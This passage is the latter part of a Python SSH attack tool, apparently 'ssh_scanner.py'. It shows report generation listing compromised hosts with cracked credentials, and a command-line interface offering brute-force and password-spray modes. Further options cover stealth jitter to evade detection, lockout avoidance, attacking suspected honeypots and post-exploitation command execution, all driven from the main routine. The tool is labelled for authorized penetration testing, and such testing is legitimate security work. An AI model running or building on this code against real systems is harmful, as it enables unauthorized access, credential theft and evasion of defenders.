                    "METHOD": cred.method if cred else "",
                    "KEY_FILE": cred.key_file if cred else "",
                    "BANNER": r.banner or "",
                    "SOFTWARE": r.software or "",
                    "VERSION": r.version or "",
                    "CVE_COUNT": len(r.cves),
                    "SEVERITY": worst_sev,
                    "HONEYPOT": "Yes" if r.honeypot_suspected else "No",
                    "ATTEMPTS": r.attempts,
                    "DURATION_S": "%.1f" % r.duration,
                    "TIMESTAMP": r.timestamp,
                })
        pp.info("CSV written to %s" % output_path)
    except OSError as e:
        pp.error("Could not write CSV output: %s" % e)


def generate_html_report(results: list, config, start_dt: datetime.datetime,
                         end_dt: datetime.datetime, output_path: str):
    """Self-contained HTML report with inline CSS."""
    duration = str(end_dt - start_dt).split('.')[0]

    successes = [r for r in results if r.status == "success"]
    cve_hosts = [r for r in results if r.cves]
    honeypots = [r for r in results if r.honeypot_suspected]

    sev_colors = {
        "CRITICAL": "#dc3545", "HIGH": "#fd7e14",
        "MEDIUM": "#ffc107", "LOW": "#17a2b8", "INFO": "#6c757d",
        "success": "#28a745", "failed": "#6c757d",
        "unreachable": "#343a40", "honeypot": "#e83e8c",
    }

    def sev_badge(sev):
        color = sev_colors.get(sev.upper(), "#6c757d")
        return "<span style='color:%s;font-weight:bold'>%s</span>" % (color, html.escape(sev.upper()))

    # Summary cards
    cards = ""
    for label, count, color in [
        ("Targets", len(results), "#00d4ff"),
        ("Compromised", len(successes), "#28a745"),
        ("CVE Hosts", len(cve_hosts), "#fd7e14"),
        ("Honeypots", len(honeypots), "#e83e8c"),
        ("Unreachable", sum(1 for r in results if r.status == "unreachable"), "#6c757d"),
    ]:
        cards += ("<div class='card'><div class='count' style='color:%s'>%d</div>"
                  "<div>%s</div></div>") % (color, count, label)

    # Successes table
    success_rows = ""
    for r in successes:
        cred = r.credential
        cves_str = ", ".join(
            "<a href='https://nvd.nist.gov/vuln/detail/%s' target='_blank' "
            "rel='noopener noreferrer'>%s</a>" % (c.cve, c.cve)
            for c in r.cves
        ) if r.cves else ""
        post_summary = ""
        if r.post_exploit:
            uid = r.post_exploit.get("current_user", "")
            hostname = r.post_exploit.get("hostname", "")
            post_summary = html.escape("%s @ %s" % (uid[:40], hostname[:40]))
        success_rows += (
            "<tr><td>%s:%d</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td>"
            "<td>%s</td><td>%s</td></tr>\n"
        ) % (
            html.escape(r.host), r.port,
            html.escape(cred.user if cred else ""),
            html.escape(cred.password if cred else ""),
            html.escape(cred.method if cred else ""),
            html.escape(r.banner or ""),
            cves_str,
            post_summary,
        )

    # CVE findings table
    cve_rows = ""
    for r in cve_hosts:
        for c in r.cves:
            cve_rows += (
                "<tr><td>%s:%d</td><td>%s</td>"
                "<td><a href='https://nvd.nist.gov/vuln/detail/%s' target='_blank'"
                " rel='noopener noreferrer'>%s</a></td>"
                "<td>%s</td><td>%s</td></tr>\n"
            ) % (
                html.escape(r.host), r.port,
                html.escape(r.banner or ""),
                c.cve, c.cve,
                sev_badge(c.severity),
                html.escape(c.description),
            )

    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SSH Scan Report</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;margin:20px;background:#1a1a2e;color:#e0e0e0;}
h1,h2{color:#00d4ff;}
.meta{color:#aaa;margin-bottom:20px;}
.cards{display:flex;flex-wrap:wrap;gap:15px;margin:15px 0;}
.card{background:#16213e;padding:15px 25px;border-radius:8px;text-align:center;min-width:100px;}
.card .count{font-size:2em;font-weight:bold;}
table{border-collapse:collapse;width:100%%;margin-top:10px;margin-bottom:30px;}
th,td{border:1px solid #333;padding:8px 10px;text-align:left;vertical-align:top;}
th{background:#16213e;color:#00d4ff;}
tr:nth-child(even){background:#0f3460;}
tr:hover{background:#1a1a4e;}
a{color:#00d4ff;text-decoration:none;}
a:hover{text-decoration:underline;}
code{background:#0f3460;padding:2px 5px;border-radius:3px;font-size:.85em;}
</style>
</head>
<body>
<h1>SSH Security Assessment Report</h1>
<div class="meta">
  Date: <strong>%s</strong> | Duration: <strong>%s</strong>
</div>
<div class="cards">%s</div>

<h2>Compromised Hosts (%d)</h2>
%s
<table>
<tr><th>Host:Port</th><th>User</th><th>Password</th><th>Method</th><th>Banner</th><th>CVEs</th><th>Post-Exploit</th></tr>
%s
</table>

<h2>CVE Findings (%d)</h2>
<table>
<tr><th>Host:Port</th><th>Banner</th><th>CVE</th><th>Severity</th><th>Description</th></tr>
%s
</table>

</body>
</html>""" % (
        html.escape(start_dt.strftime("%Y-%m-%d %H:%M:%S")),
        html.escape(duration),
        cards,
        len(successes),
        "" if successes else "<p style='color:#6c757d'>No credentials found.</p>",
        success_rows,
        len(cve_rows.strip().splitlines()),
        cve_rows if cve_rows else "<tr><td colspan='5' style='color:#6c757d'>No CVEs identified.</td></tr>",
    )

    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        pp.info("HTML report written to %s" % output_path)
    except OSError as e:
        pp.error("Could not write HTML report: %s" % e)


# ─── Signal handler ───────────────────────────────────────────────────────────

def signal_handler(sig, frame):
    pp.error("Interrupt received — finishing current attempts and saving state...")
    _shutdown_event.set()


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


# ─── CLI ──────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ssh_scanner.py",
        description="SSH Scanner v%s — Authorized Penetration Testing Tool" % VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Brute-force a single host
  ./ssh_scanner.py -r 10.0.0.1 -U users.txt -P passwords.txt

  # CIDR range, stealth mode, custom port
  ./ssh_scanner.py -r 192.168.1.0/24 -p 2222 --stealth -m 3

  # Credential spray (lockout-safe), one password across all users
  ./ssh_scanner.py -r targets.txt --spray --spray-delay 60

  # With post-exploitation enumeration, HTML report
  ./ssh_scanner.py -r 10.0.0.1 --post-exploit --html-report report.html

  # Pipeline: use nuclei_scanner live_hosts.txt
  ./ssh_scanner.py -r results_example_com_*/live_hosts.txt --json-output ssh_findings.json

  # Resume a previous scan
  ./ssh_scanner.py -r targets.txt --resume
"""
    )

    tgt = parser.add_argument_group("Target")
    tgt.add_argument("-r", "--target", dest="target", metavar="TARGET",
        help="CIDR, host, host:port, file of hosts, or '-' for stdin")
    tgt.add_argument("-p", "--port", dest="port", type=int, default=DEFAULT_PORT,
        metavar="PORT", help="Default SSH port (default: 22)")

    cred = parser.add_argument_group("Credentials")
    cred.add_argument("-U", "--userlist", dest="userlist", metavar="FILE",
        help="File with usernames (one per line)")
    cred.add_argument("-P", "--passlist", dest="passlist", metavar="FILE",
        help="File with passwords (one per line)")
    cred.add_argument("--user", dest="user", metavar="USER",
        help="Single username to test")
    cred.add_argument("--password", dest="password", metavar="PASS",
        help="Single password to test")

    auth = parser.add_argument_group("Auth Methods")
    auth.add_argument("--no-password", dest="try_password", default=True,
        action="store_false", help="Disable password auth")
    auth.add_argument("--try-ki", dest="try_ki", default=True,
        action="store_true", help="Enable keyboard-interactive auth (default: on)")
    auth.add_argument("--no-ki", dest="try_ki", action="store_false",
        help="Disable keyboard-interactive auth")
    auth.add_argument("--try-pubkeys", dest="try_pubkeys", default=False,
        action="store_true", help="Try public key auth (requires --pubkey-dir)")
    auth.add_argument("--pubkey-dir", dest="pubkey_dir", metavar="DIR",
        help="Directory of private key files to try")

    modes = parser.add_argument_group("Scan Modes")
    modes.add_argument("--spray", dest="spray", default=False, action="store_true",
        help="Spray mode: 1 password across all users (avoids lockouts)")
    modes.add_argument("--spray-delay", dest="spray_delay", type=float,
        default=DEFAULT_SPRAY_DELAY, metavar="SECS",
        help="Pause between spray rounds (default: 30s)")
    modes.add_argument("--continue-after-success", dest="continue_after_success",
        default=False, action="store_true",
        help="Keep trying credentials on a host after first success")

    stealth = parser.add_argument_group("Stealth / Rate Control")
    stealth.add_argument("--stealth", dest="stealth", default=False,
        action="store_true", help="Stealth mode: enable jitter and slow rate limit")
    stealth.add_argument("--rate-limit", dest="rate_limit", type=float, default=0,
        metavar="N", help="Max attempts per second, 0=unlimited (default: 0)")
    stealth.add_argument("--jitter-min", dest="jitter_min", type=float,
        default=DEFAULT_JITTER_MIN, metavar="SECS",
        help="Min jitter sleep in stealth mode (default: 0.5)")
    stealth.add_argument("--jitter-max", dest="jitter_max", type=float,
        default=DEFAULT_JITTER_MAX, metavar="SECS",
        help="Max jitter sleep in stealth mode (default: 3.0)")
    stealth.add_argument("--lockout-threshold", dest="lockout_threshold", type=int,
        default=DEFAULT_LOCKOUT_THRESHOLD, metavar="N",
        help="Consecutive failures before backoff (default: 5)")
    stealth.add_argument("--lockout-backoff", dest="lockout_backoff", type=float,
        default=DEFAULT_LOCKOUT_BACKOFF, metavar="SECS",
        help="Backoff duration on lockout detection (default: 60s)")

    threads = parser.add_argument_group("Threading / Timeout")
    threads.add_argument("-m", "--maxthread", dest="threads", type=int,
        default=DEFAULT_THREADS, metavar="N",
        help="Max concurrent threads (default: 10)")
    threads.add_argument("-t", "--timeout", dest="timeout", type=float,
        default=DEFAULT_TIMEOUT, metavar="SECS",
        help="Per-connection timeout in seconds (default: 10)")
    threads.add_argument("--cmd-timeout", dest="cmd_timeout", type=float,
        default=DEFAULT_CMD_TIMEOUT, metavar="SECS",
        help="Post-exploit command timeout (default: 10s)")

    post = parser.add_argument_group("Post-Exploitation")
    post.add_argument("--post-exploit", dest="post_exploit", default=False,
        action="store_true",
        help="Run enumeration commands after successful auth")
    post.add_argument("--post-cmds", dest="post_cmds_file", metavar="FILE",
        help="JSON file mapping name->command (overrides built-in defaults)")

    output = parser.add_argument_group("Output")
    output.add_argument("-o", "--output", dest="text_output", metavar="FILE",
        help="Append text log to file")
    output.add_argument("--json-output", dest="json_output",
        default=DEFAULT_JSON_OUTPUT, metavar="FILE",
        help="Write JSONL findings (default: %s)" % DEFAULT_JSON_OUTPUT)
    output.add_argument("--no-json", dest="json_output", action="store_const",
        const=None, help="Disable JSON output")
    output.add_argument("--csv-output", dest="csv_output", metavar="FILE",
        help="Write CSV findings")
    output.add_argument("--html-report", dest="html_report", metavar="FILE",
        help="Write self-contained HTML report")
    output.add_argument("--no-dashboard", dest="no_dashboard", default=False,
        action="store_true", help="Disable live stats dashboard")
    output.add_argument("-v", "--verbose", dest="verbose", default=False,
        action="store_true", help="Verbose output (show all attempts)")

    resume = parser.add_argument_group("Resume")
    resume.add_argument("--resume", dest="resume", default=False,
        action="store_true", help="Resume a previous scan from state file")
    resume.add_argument("--resume-file", dest="resume_file",
        default=DEFAULT_RESUME_FILE, metavar="FILE",
        help="State file path (default: %s)" % DEFAULT_RESUME_FILE)

    misc = parser.add_argument_group("Misc")
    misc.add_argument("--scan-honeypots", dest="scan_honeypots", default=False,
        action="store_true", help="Test credentials even if honeypot detected")
    misc.add_argument("--no-banner-check", dest="no_banner_check", default=False,
        action="store_true", help="Skip initial banner grab (faster, less info)")

    return parser


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    global verbose

    banner_art = """
  ███████╗███████╗██╗  ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ██╔════╝██╔════╝██║  ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║
  ███████╗███████╗███████║    ███████╗██║     ███████║██╔██╗ ██║
  ╚════██║╚════██║██╔══██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ███████║███████║██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║
  ╚══════╝╚══════╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
          SSH Security Assessment Tool v%s
""" % VERSION
    print(banner_art)

    parser = build_parser()
    options = parser.parse_args()

    if not options.target:
        parser.print_help()
        sys.exit(1)

    verbose = options.verbose
    ctime = datetime.datetime.now()

    # ── Load wordlists ──────────────────────────────────────────────────────
    userlist = DEFAULT_USERS[:]
    passwordlist = DEFAULT_PASSWORDS[:]

    if options.user:
        userlist = [options.user]
    elif options.userlist:
        try:
            with open(options.userlist, 'r', encoding='utf-8') as f:
                userlist = [line.rstrip('\n') for line in f if line.strip()]
        except OSError as e:
            pp.error("Cannot open userlist: %s" % e)
            sys.exit(1)

    if options.password:
        passwordlist = [options.password]
    elif options.passlist:
        try:
            with open(options.passlist, 'r', encoding='utf-8') as f:
                passwordlist = [line.rstrip('\n') for line in f if line.strip()]
        except OSError as e:
            pp.error("Cannot open passlist: %s" % e)
            sys.exit(1)

    # ── Load custom post-exploit commands ───────────────────────────────────
    post_exploit_commands = None
    if options.post_cmds_file:
        try:
            with open(options.post_cmds_file, 'r', encoding='utf-8') as f:
                post_exploit_commands = json.load(f)
        except (OSError, json.JSONDecodeError) as e:
            pp.error("Cannot load post-exploit commands file: %s" % e)
            sys.exit(1)

    # ── Load targets ────────────────────────────────────────────────────────
    targets = load_targets(options.target, options.port)
    if not targets:
        pp.error("No valid targets found in: %s" % options.target)
        sys.exit(1)

    # ── Resume handling ─────────────────────────────────────────────────────
    prior_results: list = []
    if options.resume:
        state = load_state(options.resume_file)
        if state:
            done_keys = {
                "%s:%d" % (r["host"], r["port"])
                for r in state.get("results", [])
                if r.get("status") in ("success", "failed", "skipped", "honeypot")
            }
            original_count = len(targets)
            targets = [(h, p) for (h, p) in targets
                       if "%s:%d" % (h, p) not in done_keys]
            pp.info("Resuming: %d/%d targets remaining" % (len(targets), original_count))
            # Restore prior results as HostResult objects
            for r in state.get("results", []):
                try:
                    cred_data = r.get("credential")
                    cred = Credential(**cred_data) if cred_data else None
                    cve_list = [CVEEntry(**c) for c in r.get("cves", [])]
                    hr = HostResult(
                        host=r["host"], port=r["port"], status=r["status"],
                        banner=r.get("banner"), software=r.get("software"),
                        version=r.get("version"),
                        honeypot_suspected=r.get("honeypot_suspected", False),
                        honeypot_reason=r.get("honeypot_reason"),
                        auth_methods=r.get("auth_methods", []),
                        cves=cve_list, credential=cred,
                        post_exploit=r.get("post_exploit", {}),
                        attempts=r.get("attempts", 0),
                        duration=r.get("duration", 0.0),
                        timestamp=r.get("timestamp", ""),
                        error=r.get("error"),
                    )
                    prior_results.append(hr)
                except Exception:
                    pass
        else:
            pp.warning("No valid resume file found at %s, starting fresh" % options.resume_file)

    # ── Build config ────────────────────────────────────────────────────────
    class Config:
        pass
    config = Config()
    config.userlist = userlist
    config.passwordlist = passwordlist
    config.threads = options.threads
    config.timeout = options.timeout
    config.cmd_timeout = options.cmd_timeout
    config.spray = options.spray
    config.spray_delay = options.spray_delay
    config.stealth = options.stealth
    config.jitter_min = options.jitter_min
    config.jitter_max = options.jitter_max
    config.rate_limit = options.rate_limit if not options.stealth else min(options.rate_limit or 10, 10)
    config.lockout_threshold = options.lockout_threshold
    config.lockout_backoff = options.lockout_backoff
    config.post_exploit = options.post_exploit
    config.post_exploit_commands = post_exploit_commands
    config.try_password = options.try_password
    config.try_ki = options.try_ki
    config.try_pubkeys = options.try_pubkeys
    config.pubkey_dir = options.pubkey_dir
    config.scan_honeypots = options.scan_honeypots
    config.no_banner_check = options.no_banner_check
    config.continue_after_success = options.continue_after_success
    config.text_output = options.text_output

    # ── Display scan parameters ─────────────────────────────────────────────
    pp.status("Targets:   %d hosts" % len(targets))
    pp.status("Usernames: %d  |  Passwords: %d  |  Total combos: %d" % (
        len(userlist), len(passwordlist), len(userlist) * len(passwordlist)))
    pp.status("Threads:   %d  |  Timeout: %.0fs  |  Mode: %s" % (
        options.threads, options.timeout,
        "SPRAY" if options.spray else "BRUTE-FORCE"))
    if options.stealth:
        pp.status("Stealth:   ON (jitter %.1f-%.1fs, rate limit: %g/s)" % (
            options.jitter_min, options.jitter_max, config.rate_limit))
    if options.text_output:
        write_text_log("SSH Scan started at %s" % ctime, options.text_output)

    # ── Shared state ────────────────────────────────────────────────────────
    stats = ScanStats(total_hosts=len(targets) + len(prior_results))
    stats.done_hosts = len(prior_results)
    stats.success_hosts = sum(1 for r in prior_results if r.status == "success")

    lockout = LockoutTracker(config.lockout_threshold, config.lockout_backoff)
    rate_limiter = RateLimiter(config.rate_limit)
    jitter = JitterDelay(config.jitter_min, config.jitter_max)

    # ── Dashboard ───────────────────────────────────────────────────────────
    dashboard = None
    if not options.no_dashboard and sys.stdout.isatty():
        dashboard = DashboardThread(stats)
        dashboard.start()

    # ── State auto-save (every 60s) ─────────────────────────────────────────
    _all_results: list = list(prior_results)
    _results_lock = threading.Lock()

    def _autosave():
        while not _shutdown_event.is_set():
            time.sleep(60)
            with _results_lock:
                save_state(_all_results, {}, ctime.isoformat(), options.resume_file)

    autosave_thread = threading.Thread(target=_autosave, daemon=True)
    autosave_thread.start()

    # ── Run scan ────────────────────────────────────────────────────────────
    pp.status("Starting scan...")

    if options.spray:
        new_results = run_spray_mode(targets, config, stats, lockout, rate_limiter, jitter)
    else:
        new_results = run_bruteforce_mode(targets, config, stats, lockout, rate_limiter, jitter)

    with _results_lock:
        _all_results.extend(new_results)

    # ── Stop dashboard ──────────────────────────────────────────────────────
    if dashboard:
        dashboard.stop()
        dashboard.join(timeout=2)

    etime = datetime.datetime.now()
    total = str(etime - ctime).split('.')[0]

    # ── Summary ─────────────────────────────────────────────────────────────
    successes = [r for r in _all_results if r.status == "success"]
    cve_hosts = [r for r in _all_results if r.cves]

    pp.status("Scan completed in: %s" % total)
    pp.status("Results: %d hosts | %d compromised | %d CVE hosts" % (
        len(_all_results), len(successes), len(cve_hosts)))

    if successes:
        pp.status("─── Compromised Hosts ───────────────────────────────")
        for r in successes:
            cred = r.credential
            pp.status("  [+] %s:%d  %s:%s  [%s]" % (
                r.host, r.port,
                cred.user if cred else "?",
                cred.password if cred else "?",
                cred.method if cred else "?",
            ))

    if cve_hosts:
        pp.status("─── CVE Findings ────────────────────────────────────")
        for r in cve_hosts:
            for c in r.cves:
                pp.warning("  [%s] %s:%d — %s: %s" % (
                    c.severity, r.host, r.port, c.cve, c.description[:60]))

    # ── Write outputs ────────────────────────────────────────────────────────
    if options.json_output:
        write_json_findings(_all_results, options.json_output)
    if options.csv_output:
        write_csv_findings(_all_results, options.csv_output)
    if options.html_report:
        generate_html_report(_all_results, config, ctime, etime, options.html_report)

    # Final state save
    save_state(_all_results, {}, ctime.isoformat(), options.resume_file)

    if options.text_output:
        write_text_log("Scan completed in: %s | %d compromised" % (
            total, len(successes)), options.text_output)


# ─── Compatibility shim for port_scanner.py ──────────────────────────────────

def SSHBruteForce(host: str, userlist: list, passwordlist: list):
    """Legacy interface for port_scanner.py compatibility.
    Returns (err, out, verb, warn) tuple matching v4 behaviour.
    """
    class _Cfg:
        threads = 1
        timeout = DEFAULT_TIMEOUT
        cmd_timeout = DEFAULT_CMD_TIMEOUT
        spray = False
        spray_delay = DEFAULT_SPRAY_DELAY
        stealth = False
        jitter_min = 0.0
        jitter_max = 0.0
        rate_limit = 0
        lockout_threshold = 99
        lockout_backoff = 0
        post_exploit = False
        post_exploit_commands = None
        try_password = True
        try_ki = True
        try_pubkeys = False
        pubkey_dir = None
        scan_honeypots = False
        no_banner_check = False
        continue_after_success = False
        text_output = None

    stats = ScanStats(1)
    lockout = LockoutTracker(99, 0)
    rate_limiter = RateLimiter(0)
    jitter = JitterDelay(0, 0)

    result = scan_host(
        host, DEFAULT_PORT,
        userlist or DEFAULT_USERS,
        passwordlist or DEFAULT_PASSWORDS,
        _Cfg(), stats, lockout, rate_limiter, jitter,
    )

    err, out, verb, warn = [], [], [], []
    verb.append("Performing SSH scan on %s" % host)

    if result.status == "unreachable":
        err.append("SSH not available on %s: %s" % (host, result.error or ""))
    elif result.status == "success":
        cred = result.credential
        out.append("SSH login successful on %s (%s:%s) [%s]" % (
            host,
            cred.user if cred else "",
            cred.password if cred else "",
            result.post_exploit.get("os_info", "") or result.banner or "",
        ))
    else:
        warn.append("No valid credentials found on %s (%d attempts)" % (
            host, result.attempts))

    return (err, out, verb, warn)


if __name__ == "__main__":
    main()
